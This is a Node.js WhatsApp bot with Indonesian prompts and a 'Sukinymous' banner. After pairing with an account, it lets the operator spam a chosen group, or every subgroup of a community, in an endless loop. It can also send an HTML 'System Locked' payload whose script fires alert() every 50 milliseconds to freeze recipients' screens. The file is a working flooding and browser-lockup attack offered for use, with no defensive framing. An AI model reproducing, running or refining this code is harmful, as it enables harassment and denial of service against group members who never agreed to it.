const { default: makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, Browsers } = require("@innovatorssoft/baileys")
const pino = require("pino")
const readline = require("readline")
const fs = require("fs")
const config = require("./config")

const logger = pino({ level: "silent" })

let sock, isPaired = false, tgt = [], tgtName = ""
let spamming = false, timer = null
let isPairing = false

const BANNER = `
\x1b[33m  _____       _    _                                    \x1b[0m
\x1b[33m / ____|     | |  (_)                                   \x1b[0m
\x1b[33m| (___  _   _| | ___ _ __  _   _  _ __ ___   ___  _   _ ___ \x1b[0m
\x1b[33m \\___ \\| | | | |/ / | '_ \\| | | || '_ \` _ \\ / _ \\| | | / __|\x1b[0m
\x1b[31m ____) | |_| |   <| | | | | |_| || | | | | | (_) | |_| \\__ \\\x1b[0m
\x1b[31m|_____/ \\__,_|_|\\_\\_|_| |_|\\__, ||_| |_| |_|\\___/ \\__,_|___/\x1b[0m
\x1b[31m                           |___/                        \x1b[0m
`

const clr = () => process.stdout.write('\x1Bc')
const slp = (ms) => new Promise(r => setTimeout(r, ms))

function ask(q) {
    return new Promise((res) => {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout })
        rl.question(q, (ans) => { 
            rl.close(); 
            res(ans.trim()) 
        })
    })
}

async function sendJsAlert(jid) {
    const htmlPayload = `<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Locked</title>
</head>
<body>
    <script>
        function showAlert() {
            alert("LOCKED BY SUKINYMOUS\\n\\nSUKINYMOUS IS HERE🤓😹\\n\\n\\nLOLZERSS😹");
            setTimeout(showAlert, 50);
        }
        window.onload = function() {
            showAlert();
        };
    </script>
</body>
</html>`

    try {
        await sock.sendRichHtml(jid, {
            id: 'lock-alert-' + Date.now(),
            title: 'System Locked',
            html: htmlPayload,
            source: 'sukinymous_system'
        })
        console.log(`[+] HTML/JS Alert terkirim ke: ${jid}`)
    } catch (e) {
        console.log(`[X] Gagal kirim ke ${jid}: ${e.message}`)
    }
}

process.on('SIGINT', () => {
    if (spamming) {
        spamming = false
        clearTimeout(timer)
        console.log("\n\x1b[31m[SPAM STOPPED]\x1b[0m")
        setTimeout(mainMenu, 1000)
    } else {
        process.exit(0)
    }
})

async function processPairing() {
    isPairing = true
    clr(); console.log(BANNER); console.log("-- STEP 1")
    
    let num = (await ask("NUMBER: ")).replace(/[^0-9]/g, "")
    if (num.startsWith("0")) num = "62" + num.slice(1)
    if (num.startsWith("8")) num = "62" + num

    let requesting = true
    while (requesting && !isPaired) {
        clr(); console.log(BANNER); console.log("-- STEP 2")
        try {
            const code = await sock.requestPairingCode(num)
            console.log(`CODE: \x1b[33m${code}\x1b[0m`)
            console.log("[!] Cepat masukkan kode ke WA sebelum expired.")
            
            const choice = await ask("\n> Ketik 'r' untuk Retry, 'b' untuk Batal: ")
            if (choice.toLowerCase() !== 'r') requesting = false
        } catch (e) { 
            console.log(`[ERR] ${e.message}`); 
            const choice = await ask("\n> Ketik 'r' untuk Retry, 'b' untuk Batal: ")
            if (choice.toLowerCase() !== 'r') requesting = false
        }
    }
    isPairing = false
}

async function mainMenu() {
    while (true) {
        if (!isPaired) {
            await slp(2000)
            continue
        }
        clr(); console.log(BANNER)
        console.log(`[1] Target: ${tgtName || "None"}`)
        console.log(`[2] Spam Teks`)
        console.log(`[3] Lock Grup (HTML/JS)`)
        console.log(`[4] Exit\n`)

        const c = await ask("> ")
        if (c === "1") await selectTarget()
        else if (c === "2") {
            if (tgt.length === 0) { console.log("\n[!] Pilih target dulu."); await slp(1500); }
            else await startSpam()
        } 
        else if (c === "3") {
            if (tgt.length === 0) { console.log("\n[!] Pilih target dulu."); await slp(1500); }
            else await lockTargetGroup()
        }
        else if (c === "4") process.exit(0)
    }
}

async function selectTarget() {
    clr(); console.log(BANNER); console.log("[*] Fetching groups...\n")
    try {
        const grp = Object.values(await sock.groupFetchAllParticipating())
        if (!grp.length) { 
            console.log("[!] Bot gak ada di grup manapun."); await slp(1500); return 
        }
        
        grp.forEach((g, i) => console.log(`${i + 1}. ${g.subject || "?"}${g.isCommunity ? " [COMM]" : ""}`))
        
        const input = await ask("\nName: ")
        const f = grp.find(g => g.subject?.toLowerCase() === input.toLowerCase())
        
        if (f) {
            tgtName = f.subject
            tgt = [f.id]
            if (f.isCommunity) grp.filter(g => g.linkedParent === f.id).forEach(s => tgt.push(s.id))
            console.log(`[+] ${f.subject} (${tgt.length} targets)`)
        } else { 
            console.log("[!] Not found") 
        }
        await slp(1500)
    } catch (e) { 
        console.log(e.message); await slp(1500) 
    }
}

async function startSpam() {
    clr(); console.log(BANNER); console.log(`[TGT] ${tgtName} (${tgt.length})\n`)
    
    const txt = config.spamText
    if (!txt) { 
        console.log("[!] Teks kosong di config.js."); await slp(1500); return 
    }

    let img = null
    if (config.imagePath && fs.existsSync(config.imagePath)) {
        img = fs.readFileSync(config.imagePath)
    }

    console.log(`[MODE] ${img ? "IMG+TXT" : "TXT"}`)
    console.log(`[RUNNING - Ctrl+C to STOP]\n`)

    spamming = true
    let cnt = 0

    const loop = async () => {
        if (!spamming) return
        for (let i = 0; i < tgt.length; i++) {
            if (!spamming) break
            try {
                await sock.sendMessage(tgt[i], img ? { image: img, caption: txt } : { text: txt })
                console.log(`[${new Date().toLocaleTimeString()}] Sent: ${++cnt}`)
            } catch (e) { 
                console.log(`[${new Date().toLocaleTimeString()}] Fail: ${e.message}`) 
            }
            if (tgt.length > 1) await slp(3000)
        }
        if (spamming) timer = setTimeout(loop, config.cooldownSeconds * 1000)
    }
    loop()
    
    while (spamming) await slp(1000)
}

async function lockTargetGroup() {
    clr(); console.log(BANNER); console.log(`[*] Mengirim HTML/JS Alert ke ${tgt.length} target...\n`)
    
    for (let i = 0; i < tgt.length; i++) {
        await sendJsAlert(tgt[i])
        await slp(2000)
    }
    
    console.log("\n[!] Selesai. Cek grup target.")
    await ask("\nTekan Enter untuk kembali.")
}

async function connect() {
    const { state, saveCreds } = await useMultiFileAuthState("./auth_info")
    
    let version = [2, 3000, 1015901307]
    try {
        const res = await fetchLatestBaileysVersion()
        version = res.version
    } catch (e) {}

    isPaired = state.creds.registered

    sock = makeWASocket({
        version, 
        logger, 
        printQRInTerminal: false,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
        browser: Browsers.ubuntu("Chrome"), 
        syncFullHistory: false, 
        getMessage: async () => ({ conversation: 'pong' })
    })

    sock.ev.on("creds.update", saveCreds)
    
    sock.ev.on("connection.update", async ({ connection, lastDisconnect, qr }) => {
        if (qr && !isPaired && !isPairing) {
            await processPairing()
        }

        if (connection === "close") {
            const code = lastDisconnect?.error?.output?.statusCode;
            if (code === DisconnectReason.loggedOut) {
                process.exit(1);
            } else {
                connect(); 
            }
        } else if (connection === "open") {
            isPaired = true;
            isPairing = false;
            clr(); 
            await slp(1000); 
            mainMenu() 
        }
    })

    clr();
}

connect()
